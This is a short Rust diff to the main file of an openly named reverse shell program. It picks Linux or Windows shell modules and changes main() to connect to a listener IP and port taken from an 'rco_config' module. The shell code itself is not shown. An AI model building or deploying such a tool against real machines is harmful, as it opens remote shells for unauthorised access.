@@ -1,6 +1,3 @@
-// Load configuration values
-mod config;
-
 // Load the appropriate operating system's implementation
 #[cfg(target_os = "linux")]
 mod rco_reverse_shell_linux;
@@ -13,5 +10,5 @@ mod rco_reverse_shell_windows;
 use rco_reverse_shell_windows::shell;
 
 fn main() {
-    shell(config::IP, config::PORT);
+    shell(rco_config::LISTENER_IP, rco_config::LISTENER_PORT);
 }
